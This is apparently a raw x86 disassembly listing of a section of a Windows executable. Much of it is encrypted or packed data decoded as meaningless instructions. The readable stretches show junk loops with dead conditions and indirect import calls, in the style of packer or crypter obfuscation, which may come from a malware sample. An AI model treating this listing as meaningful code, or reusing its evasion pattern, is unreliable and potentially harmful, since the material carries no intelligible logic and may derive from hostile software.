  409f7e:	inc    edi
  409f7f:	sbb    BYTE PTR ds:0xb426bf14,cl
  409f85:	adc    DWORD PTR [ecx+0x4e],esp
  409f88:	mov    cl,0xc5
  409f8a:	xchg   esp,eax
  409f8b:	ret    0xc1a0
  409f8e:	jae    0x40a001
  409f90:	mov    eax,ds:0x23cf4429
  409f95:	sbb    al,0x5c
  409f97:	lahf   
  409f98:	dec    edi
  409f99:	(bad)  
  409f9a:	into   
  409f9b:	jo     0x409ffe
  409f9d:	scas   eax,DWORD PTR es:[edi]
  409f9e:	loop   0x409fa4
  409fa0:	push   0x61f79889
  409fa5:	shl    dh,0x5d
  409fa8:	adc    esp,DWORD PTR [edi]
  409faa:	sar    DWORD PTR [esi],0x25
  409fad:	cdq    
  409fae:	inc    ebp
  409faf:	repnz dec edi
  409fb1:	xchg   ebx,eax
  409fb2:	mov    ebp,0x557666c6
  409fb7:	das    
  409fb8:	int    0x9b
  409fba:	jb     0x40a036
  409fbc:	imul   edx,DWORD PTR [edi+edi*1-0x42],0xdbf3d0e9
  409fc4:	or     esp,DWORD PTR [edx]
  409fc6:	test   dh,al
  409fc8:	stos   BYTE PTR es:[edi],al
  409fc9:	je     0x409fc6
  409fcb:	inc    esi
  409fcc:	dec    ebx
  409fcd:	into   
  409fce:	cwde   
  409fcf:	sbb    eax,0x5a8de946
  409fd4:	clc    
  409fd5:	and    ecx,DWORD PTR [eax-0x67]
  409fd8:	add    DWORD PTR [ecx-0x57],esp
  409fdb:	fs call 0x4162:0x63da1e66
  409fe3:	xchg   ecx,eax
  409fe4:	mov    ebx,0xaf9c9b3f
  409fe9:	mov    esi,0x7fbc9d12
  409fee:	cs sti 
  409ff0:	mul    DWORD PTR [ebx*1+0x2f4567ea]
  409ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ff8:	test   eax,0x9a60f4fe
  409ffd:	aas    
  409ffe:	jle    0x409fd9
  40a000:	lods   al,BYTE PTR ds:[esi]
  40a001:	rol    DWORD PTR [eax],0xbf
  40a004:	push   esi
  40a005:	jl     0x409fb4
  40a007:	sub    eax,0xd6b5ba20
  40a00c:	mov    ebx,0x20d01ac7
  40a011:	jo     0x409fcc
  40a013:	test   edi,ebx
  40a015:	push   ss
  40a016:	sub    bh,dh
  40a018:	pushf  
  40a019:	outs   dx,DWORD PTR ds:[esi]
  40a01a:	cwde   
  40a01b:	shl    DWORD PTR [ebp+0x5d],cl
  40a01e:	dec    ebp
  40a01f:	call   0xeab137cc
  40a024:	icebp  
  40a025:	xchg   ecx,eax
  40a026:	scas   eax,DWORD PTR es:[edi]
  40a027:	push   esi
  40a028:	push   ds
  40a029:	push   0x3b6ff90a
  40a02e:	jo     0x40a065
  40a030:	mov    eax,ds:0xd634a51b
  40a035:	aas    
  40a036:	mov    eax,0xc09476c6
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x7160,0x87
  40a1b4:	inc    ebp
  40a1b5:	xor    edx,esp
  40a1b7:	stc    
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	pop    edx
  40a1bf:	xchg   edx,eax
  40a1c0:	in     eax,dx
  40a1c1:	mov    dh,bh
  40a1c3:	mov    al,0xcf
  40a1c5:	fdivr  DWORD PTR [edx-0x4e]
  40a1c8:	xchg   esp,eax
  40a1c9:	fwait
  40a1ca:	mov    ch,0x87
  40a1cc:	mov    ecx,0x2f36c5ad
  40a1d1:	es gs ss jecxz 0x40a1b3
  40a1d6:	leave  
  40a1d7:	adc    ecx,DWORD PTR [edx+0x8]
  40a1da:	mov    edx,0x788ec6aa
  40a1df:	aaa    
  40a1e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1e1:	sar    cl,cl
  40a1e3:	inc    esp
  40a1e4:	push   0x27ac93a4
  40a1e9:	add    eax,0x9a275050
  40a1ee:	fmul   DWORD PTR [edi+0x2ff0fe7f]
  40a1f4:	pusha  
  40a1f5:	push   ss
  40a1f6:	sbb    al,0x71
  40a1f8:	ror    DWORD PTR [ecx],1
  40a1fa:	in     eax,0x5c
  40a1fc:	les    edi,FWORD PTR [ebx]
  40a1fe:	pop    edi
  40a1ff:	(bad)
  40a203:	test   eax,0xf18f76af
  40a208:	das    
  40a209:	inc    ebx
  40a20a:	enter  0xcbd1,0xb1
  40a20e:	xor    eax,0x35fbd4ac
  40a213:	xor    cl,bh
  40a215:	or     dh,BYTE PTR [esi]
  40a217:	scas   eax,DWORD PTR es:[edi]
  40a218:	inc    eax
  40a219:	cmp    eax,0x1ba985d6
  40a21e:	sbb    al,0x6b
  40a220:	sahf   
  40a221:	stos   BYTE PTR es:[edi],al
  40a222:	jne    0x40a1b3
  40a224:	mov    esp,0x4e2f32b7
  40a229:	jecxz  0x40a21c
  40a22b:	mov    cl,0x40
  40a22d:	jno    0x40a23d
  40a22f:	dec    esi
  40a230:	pop    esp
  40a231:	shr    DWORD PTR [ebx-0x42b0b41b],0x65
  40a238:	(bad)  
  40a239:	scas   al,BYTE PTR es:[edi]
  40a23a:	or     ch,BYTE PTR [edi+0x5c]
  40a23d:	jle    0x40a285
  40a23f:	daa    
  40a240:	fcom   QWORD PTR [ebp+0xc01f01f]
  40a246:	call   0x113d2cad
  40a24b:	jmp    0x6ff:0x925d61d0
  40a252:	stos   BYTE PTR es:[edi],al
  40a253:	sub    BYTE PTR [edi],bl
  40a255:	mov    ebp,0x1960db8f
  40a25a:	in     al,0xf1
  40a25c:	lea    esp,ss:[edi+ebp*1-0x3894b6be]
  40a264:	test   eax,0xa8a58b6e
  40a269:	das    
  40a26a:	iret   
  40a26b:	fs inc ch
  40a26e:	loope  0x40a23b
  40a270:	adc    DWORD PTR [ebx+0x76],edx
  40a273:	popf   
  40a274:	add    al,dl
  40a276:	mov    dl,0x35
  40a278:	rcl    DWORD PTR ds:0xba1ac76d,0xf8
  40a27f:	aad    0x28
  40a281:	fidiv  WORD PTR [eax-0x2a1c75e6]
  40a287:	cmp    DWORD PTR [ecx+edx*1],ebx
  40a28a:	jne    0x40a241
  40a28c:	xchg   ebp,eax
  40a28d:	xchg   edx,eax
  40a28e:	sbb    eax,0xcd3b173c
  40a293:	sbb    BYTE PTR [ecx],bh
  40a295:	jmp    0xd524:0x3890d510
  40a29c:	cwde   
  40a29d:	mov    ebx,0xefd09457
  40a2a2:	fdivr  QWORD PTR [esi-0x2f130cc1]
  40a2a8:	sbb    BYTE PTR [edx+0x66],dh
  40a2ab:	mov    al,0xcc
  40a2ad:	fmul   DWORD PTR [edi+ebp*2+0x92d7a10]
  40a2b4:	mov    ebp,0x519b9635
  40a2b9:	outs   dx,BYTE PTR ds:[esi]
  40a2ba:	stc    
  40a2bb:	in     eax,0x25
  40a2bd:	stc    
  40a2be:	popa   
  40a2bf:	pop    edx
  40a2c0:	aad    0x8d
  40a2c2:	sbb    dh,BYTE PTR [eax]
  40a2c4:	cld    
  40a2c5:	rcl    ecx,1
  40a2c7:	mov    al,0x16
  40a2c9:	or     esp,DWORD PTR [edi]
  40a2cb:	fld    QWORD PTR [ecx+0x143b39d4]
  40a2d1:	pop    ds
  40a2d2:	fwait
  40a2d3:	aas    
  40a2d4:	inc    eax
  40a2d5:	test   al,0x10
  40a2d7:	(bad)  
  40a2d8:	call   0xf4dddb21
  40a2dd:	ret    
  40a2de:	mov    WORD PTR [esi-0x7e2c9ccc],ss
  40a2e4:	imul   edx,DWORD PTR [ebx],0x72
  40a2e7:	mov    ebx,0xfbedaa79
  40a2ec:	mov    esi,DWORD PTR [ebp+0x612a5634]
  40a2f2:	jmp    0x40a306
  40a2f4:	lahf   
  40a2f5:	sub    eax,0x14376f6a
  40a2fa:	mov    eax,ds:0x2c9915e1
  40a2ff:	dec    ecx
  40a300:	call   0xf4911c0b
  40a305:	sahf   
  40a306:	psrld  mm7,QWORD PTR [ecx]
  40a309:	sahf   
  40a30a:	xchg   ebp,eax
  40a30b:	in     al,dx
  40a30c:	aaa    
  40a30d:	mov    ebx,0x6f04cd85
  40a312:	mov    edi,edi
  40a314:	ds jmp 0x40a2b1
  40a317:	jns    0x40a35d
  40a319:	pop    eax
  40a31a:	dec    ecx
  40a31b:	xchg   DWORD PTR [ecx-0x58],ebp
  40a31e:	shr    DWORD PTR [edx-0x68289348],cl
  40a324:	test   dh,ch
  40a326:	iret   
  40a327:	pop    ecx
  40a328:	aaa    
  40a329:	call   0xf27d:0x92823642
  40a330:	ins    DWORD PTR es:[edi],dx
  40a331:	sub    eax,0x3f8ddcfd
  40a336:	add    eax,0x8bdb1398
  40a33b:	push   ds
  40a33c:	and    eax,0x48e563dd
  40a341:	push   eax
  40a342:	scas   al,BYTE PTR es:[edi]
  40a343:	and    dh,ah
  40a345:	cmp    edx,edx
  40a347:	mov    ah,BYTE PTR [edi]
  40a349:	icebp  
  40a34a:	fldcw  WORD PTR [ebx-0x23]
  40a34d:	fld    DWORD PTR [eax-0x63b5fe06]
  40a353:	jecxz  0x40a3ad
  40a355:	adc    esi,0xbd0c1de2
  40a35b:	pusha  
  40a35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a35d:	ins    DWORD PTR es:[edi],dx
  40a35e:	xor    BYTE PTR [eax+0x4d],cl
  40a361:	dec    ebx
  40a362:	cmp    al,0x8f
  40a364:	mov    eax,0x978d0468
  40a369:	jno    0x40a362
  40a36b:	sub    DWORD PTR [edx-0x56],ebp
  40a36e:	aaa    
  40a36f:	and    ecx,ecx
  40a371:	es jge 0x40a3bd
  40a374:	push   esp
  40a375:	and    DWORD PTR [edi],eax
  40a377:	adc    al,0xa6
  40a379:	xchg   ecx,eax
  40a37a:	dec    eax
  40a37b:	or     eax,0xd8378bdb
  40a380:	test   BYTE PTR ds:0x9711aacb,cl
  40a386:	xor    al,0x0
  40a388:	push   esi
  40a389:	mov    ds,WORD PTR [ecx+0x5ea244c4]
  40a38f:	adc    eax,DWORD PTR [esi+0x682b1c02]
  40a395:	ret    0x6e5c
  40a398:	int3   
  40a399:	fbld   TBYTE PTR [edx]
  40a39b:	mov    ecx,0xb8b7b7be
  40a3a0:	loope  0x40a417
  40a3a2:	pushf  
  40a3a3:	add    ecx,DWORD PTR [edx-0x729016b]
  40a3a9:	js     0x40a36b
  40a3ab:	mov    edx,0xbcebccf6
  40a3b0:	(bad)  
  40a3b1:	sbb    BYTE PTR [eax-0x2de2ffd1],bh
  40a3b7:	xchg   BYTE PTR [eax-0x38],al
  40a3ba:	(bad)  
  40a3bb:	and    BYTE PTR [esi+eiz*2+0x41],bh
  40a3bf:	js     0x40a3a9
  40a3c1:	push   ds
  40a3c2:	test   al,0x20
  40a3c4:	int3   
  40a3c5:	popa   
  40a3c6:	sti    
  40a3c7:	in     al,dx
  40a3c8:	daa    
  40a3c9:	(bad)  
  40a3ca:	fdivr  QWORD PTR [ebp-0x6d19388e]
  40a3d0:	or     eax,0xa509c241
  40a3d5:	ret    0xe121
  40a3d8:	lea    edi,[edx-0x7f]
  40a3db:	clc    
  40a3dc:	push   ds
  40a3dd:	fild   QWORD PTR [ecx]
  40a3df:	sbb    al,0xce
  40a3e1:	jne    0x40a428
  40a3e3:	pusha  
  40a3e4:	out    0xa4,al
  40a3e6:	mov    edi,0xdb9137fd
  40a3eb:	fsubr  st,st(1)
  40a3ed:	inc    edi
  40a3ee:	mov    al,0x45
  40a3f0:	xlat   BYTE PTR ds:[ebx]
  40a3f1:	iret   
  40a3f2:	sbb    al,0x5c
  40a3f4:	xchg   ebx,eax
  40a3f5:	inc    esi
  40a3f6:	dec    ebp
  40a3f7:	push   esp
  40a3f8:	lahf   
  40a3f9:	mov    dl,0xba
  40a3fb:	mov    DWORD PTR [eax-0x632494cf],eax
  40a401:	outs   dx,DWORD PTR ds:[esi]
  40a402:	cmp    eax,0x7b05cd1e
  40a407:	push   0xffffffed
  40a409:	test   al,0xce
  40a40b:	rol    BYTE PTR [edi-0x25],1
  40a40e:	xor    eax,0xbf7a5689
  40a413:	pop    ecx
  40a414:	jne    0x40a3b3
  40a416:	jmp    0xc3bf3b33
  40a41b:	inc    esp
  40a41c:	outs   dx,BYTE PTR ds:[esi]
  40a41d:	dec    esi
  40a41e:	jecxz  0x40a490
  40a420:	adc    DWORD PTR [eax],ebp
  40a422:	push   ebx
  40a423:	adc    eax,0x58174af7
  40a428:	sbb    eax,0xbcde9de7
  40a42d:	add    ebx,DWORD PTR [edi+0x16]
  40a430:	pop    ss
  40a431:	sub    dh,BYTE PTR [esi]
  40a433:	aas    
  40a434:	aam    0xdf
  40a436:	fdivr  QWORD PTR [edx+0x5f]
  40a439:	push   esp
  40a43a:	hlt    
  40a43b:	mov    WORD PTR [edi+edi*1+0x29],gs
  40a43f:	ret    
  40a440:	mov    edx,0xce8f2fb5
  40a445:	ins    BYTE PTR es:[edi],dx
  40a446:	mov    ch,0x96
  40a448:	mov    ds:0xdd996a5d,al
  40a44d:	fdiv   DWORD PTR [esi+0x70]
  40a450:	push   ebp
  40a451:	cmp    DWORD PTR [eax+ebp*1],esi
  40a454:	addr16 sbb edx,0x215d3659
  40a45b:	pusha  
  40a45c:	dec    ebx
  40a45d:	cmp    BYTE PTR [ecx+0x714a8479],0x27
  40a464:	icebp  
  40a465:	iret   
  40a466:	leave  
  40a467:	ficom  DWORD PTR [esi+0x55]
  40a46a:	lock and esp,edx
  40a46d:	clc    
  40a46e:	call   edi
  40a470:	mov    ebx,0xce838d15
  40a475:	cdq    
  40a476:	clc    
  40a477:	inc    ebx
  40a478:	xchg   edx,eax
  40a479:	ss std 
  40a47b:	stos   BYTE PTR es:[edi],al
  40a47c:	mov    ch,BYTE PTR [edx]
  40a47e:	inc    ebx
  40a47f:	jecxz  0x40a423
  40a481:	push   ebp
  40a482:	adc    ch,bl
  40a484:	xchg   DWORD PTR [ebx+0x77],esi
  40a487:	je     0x40a4c5
  40a489:	test   DWORD PTR [edx+0x6981e004],0x8ba73d10
  40a493:	xchg   edi,eax
  40a494:	test   DWORD PTR [ebx+0x2f],0x9135b800
  40a49b:	mov    esp,0x8a0d6b9f
  40a4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4a1:	scas   al,BYTE PTR es:[edi]
  40a4a2:	loopne 0x40a428
  40a4a4:	in     al,dx
  40a4a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4a6:	imul   ecx,DWORD PTR [esi],0xc56b9a7a
  40a4ac:	jmp    0x40a51d
  40a4ae:	adc    BYTE PTR [eax-0x22],bh
  40a4b1:	pop    ds
  40a4b2:	and    DWORD PTR [ebp+0x7f],eax
  40a4b5:	jo     0x40a519
  40a4b7:	mov    edx,0x458dfc35
  40a4bc:	fadd   QWORD PTR [ecx+0x42a7cd25]
  40a4c2:	add    ch,dh
  40a4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c5:	inc    edx
  40a4c6:	add    BYTE PTR [ecx+0x2d81d845],cl
  40a4cc:	mov    DWORD PTR [eax+0x30d00042],ebp
  40a4d2:	add    BYTE PTR [eax],al
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x3e],dh
  40a61b:	push   esp
  40a61c:	daa    
  40a61d:	(bad)
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	xchg   esp,eax
  40a627:	sub    BYTE PTR [ecx],bh
  40a629:	xor    BYTE PTR [edi-0x13f378be],ch
  40a62f:	fs sub al,0x53
  40a632:	jecxz  0x40a670
  40a634:	and    al,0xa
  40a636:	scas   al,BYTE PTR es:[edi]
  40a637:	mov    cl,0x8d
  40a639:	fisttp QWORD PTR [ebx]
  40a63b:	lods   ax,WORD PTR ds:[esi]
  40a63d:	push   ebx
  40a63e:	or     BYTE PTR [ebp+0x2],bl
  40a641:	ret    0x2a83
  40a644:	cld    
  40a645:	sbb    BYTE PTR [ebp+ecx*1-0x1624948e],dl
  40a64c:	or     ebp,DWORD PTR [eax-0x75]
  40a64f:	popf   
  40a650:	je     0x40a5d6
  40a652:	sbb    BYTE PTR [ebp-0x5c6c1a83],dl
  40a658:	dec    ecx
  40a659:	xchg   esi,eax
  40a65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65b:	mov    esp,0x15bd600
  40a660:	out    dx,al
  40a661:	mov    eax,ds:0x4100f9f9
  40a666:	pop    edi
  40a667:	or     eax,0x63ed88fa
  40a66c:	and    BYTE PTR [eax+0x2f],cl
  40a66f:	int    0xc6
  40a671:	add    edi,DWORD PTR [esi]
  40a673:	mov    edx,0x70d2ba56
  40a678:	jmp    0xadbe:0xb3153741
  40a67f:	repnz lods eax,DWORD PTR ds:[esi]
  40a681:	(bad)  
  40a682:	outs   dx,DWORD PTR ds:[esi]
  40a683:	ror    BYTE PTR [edx+0x2d],0x1f
  40a687:	sub    ah,dl
  40a689:	mov    edx,eax
  40a68b:	daa    
  40a68c:	add    BYTE PTR ds:0x5e68daf5,cl
  40a692:	sbb    ebp,DWORD PTR [esi+0x1b0acfaf]
  40a698:	add    ebp,ebx
  40a69a:	mov    dh,0xea
  40a69c:	or     BYTE PTR [edi+ecx*8-0x6a],cl
  40a6a0:	in     al,0xc6
  40a6a2:	std    
  40a6a3:	in     eax,0xa6
  40a6a5:	std    
  40a6a6:	sahf   
  40a6a7:	sahf   
  40a6a8:	nop
  40a6a9:	mov    cl,0xb2
  40a6ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6ac:	sbb    edi,DWORD PTR [ebx]
  40a6ae:	mov    dl,0x11
  40a6b0:	and    al,0xdc
  40a6b2:	push   esp
  40a6b3:	int    0xc5
  40a6b5:	(bad)  
  40a6b6:	ficomp DWORD PTR [edi-0x40ce0b02]
  40a6bc:	jmp    0xbc87:0x9514b1b8
  40a6c3:	mov    edx,0x53a4001e
  40a6c8:	mov    esi,DWORD PTR [eax+ecx*2]
  40a6cb:	jnp    0x40a68a
  40a6cd:	int    0x3
  40a6cf:	cmp    eax,eax
  40a6d1:	cmp    bh,BYTE PTR ds:0xe87341e8
  40a6d7:	fild   WORD PTR [ebx]
  40a6d9:	loop   0x40a70a
  40a6db:	ss aas 
  40a6dd:	adc    bh,BYTE PTR [esi+0x62]
  40a6e0:	in     al,dx
  40a6e1:	call   0xe7df:0x97ff43cd
  40a6e8:	sbb    BYTE PTR [eax-0x4b],cl
  40a6eb:	cwde   
  40a6ec:	sbb    BYTE PTR [eax],al
  40a6ee:	fcmovbe st,st(0)
  40a6f0:	sbb    dh,BYTE PTR [esi]
  40a6f2:	stos   BYTE PTR es:[edi],al
  40a6f3:	cmp    al,0xbe
  40a6f5:	adc    eax,0x856f074e
  40a6fa:	stos   DWORD PTR es:[edi],eax
  40a6fb:	adc    al,0x90
  40a6fd:	and    DWORD PTR [ebx-0x2],esi
  40a700:	sbb    eax,0xda39ee40
  40a705:	lds    esp,FWORD PTR [eax]
  40a707:	pop    DWORD PTR ds:0x2e09d9c2
  40a70d:	sub    ebx,0xfffffff6
  40a710:	(bad)  
  40a711:	mul    DWORD PTR [ecx+ecx*2-0x41d96a38]
  40a718:	jp     0x40a761
  40a71a:	jbe    0x40a701
  40a71c:	inc    ebx
  40a71d:	mov    ebp,DWORD PTR [eax]
  40a71f:	rol    al,1
  40a721:	push   0xffffff8b
  40a723:	sub    DWORD PTR [ebp-0x33],0x24
  40a727:	pop    ds
  40a728:	sbb    al,0xb6
  40a72a:	leave  
  40a72b:	ror    DWORD PTR [ecx-0x20],1
  40a72e:	jl     0x40a7af
  40a730:	mov    dh,0x30
  40a732:	ins    DWORD PTR es:[edi],dx
  40a733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a734:	sahf   
  40a735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a736:	jecxz  0x40a747
  40a738:	jle    0x40a719
  40a73a:	sbb    eax,0x832c764b
  40a73f:	ret    0x2693
  40a742:	and    eax,0x216a1bc6
  40a747:	stos   DWORD PTR es:[edi],eax
  40a748:	out    0x8b,al
  40a74a:	sub    BYTE PTR [ebx+0x55b3d7fd],bl
  40a750:	mov    esp,0x49a7fdd6
  40a755:	call   0xeddbceb7
  40a75a:	jmp    0x5490:0x8bac1ed2
  40a761:	ja     0x40a768
  40a763:	(bad)  
  40a764:	jmp    0x1b8164e5
  40a769:	ins    DWORD PTR es:[edi],dx
  40a76a:	ret    0x6657
  40a76d:	and    eax,0xa35011de
  40a772:	dec    edx
  40a773:	stos   BYTE PTR es:[edi],al
  40a774:	jmp    0xdf3d:0x46edfaf3
  40a77b:	int3   
  40a77c:	fbld   TBYTE PTR [edi+0x4b0cf525]
  40a782:	pop    esi
  40a783:	lods   eax,DWORD PTR ds:[esi]
  40a784:	fistp  DWORD PTR [edi]
  40a786:	icebp  
  40a787:	int    0x5f
  40a789:	imul   esi,DWORD PTR [edi],0x643134f0
  40a78f:	pushf  
  40a790:	sub    DWORD PTR [edi],ecx
  40a792:	xchg   esp,eax
  40a793:	jbe    0x40a7af
  40a795:	(bad)  
  40a796:	enter  0xb83d,0xd1
  40a79a:	cdq    
  40a79b:	push   ecx
  40a79c:	add    ah,al
  40a79e:	fwait
  40a79f:	scas   al,BYTE PTR es:[edi]
  40a7a0:	mov    cl,0x29
  40a7a2:	and    ebp,DWORD PTR [edx]
  40a7a4:	ja     0x40a7bd
  40a7a6:	xchg   ebp,eax
  40a7a7:	out    0x94,eax
  40a7a9:	mov    WORD PTR [bp+si-0x49fd],ds
  40a7ae:	in     al,0xab
  40a7b0:	add    DWORD PTR [ebp-0x79],edi
  40a7b3:	or     BYTE PTR [edi],0x8f
  40a7b6:	enter  0x8396,0x46
  40a7ba:	inc    eax
  40a7bb:	cld    
  40a7bc:	cmp    DWORD PTR [ecx-0x5fac71f8],esp
  40a7c2:	add    eax,0x2a4d1461
  40a7c7:	pop    edx
  40a7c8:	push   es
  40a7c9:	outs   dx,BYTE PTR ds:[esi]
  40a7ca:	out    0x5e,eax
  40a7cc:	mov    ?,WORD PTR [edx-0x6472d97c]
  40a7d2:	hlt    
  40a7d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7d4:	xlat   BYTE PTR ds:[ebx]
  40a7d5:	xor    eax,0x40c34e99
  40a7da:	hlt    
  40a7db:	sub    BYTE PTR [edi],al
  40a7dd:	jmp    0x40a7bf
  40a7df:	mov    ch,0x3b
  40a7e1:	xor    ebp,esi
  40a7e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7e4:	inc    ebp
  40a7e5:	nop
  40a7e6:	jmp    0x4271:0xfb59881a
  40a7ed:	cmp    al,0x75
  40a7ef:	psllq  mm4,QWORD PTR ds:0x52f74083
  40a7f6:	cmp    ebx,DWORD PTR [esi]
  40a7f8:	out    0x1e,al
  40a7fa:	bound  esp,QWORD PTR [esp+edi*1-0x1c1e32df]
  40a801:	push   ss
  40a802:	ss stos BYTE PTR es:[edi],al
  40a804:	popf   
  40a805:	arpl   WORD PTR [ebx],bp
  40a807:	clc    
  40a808:	or     ch,dl
  40a80a:	repz pop ds
  40a80c:	mov    al,0x51
  40a80e:	sbb    bl,BYTE PTR [ebx-0x3]
  40a811:	pop    ds
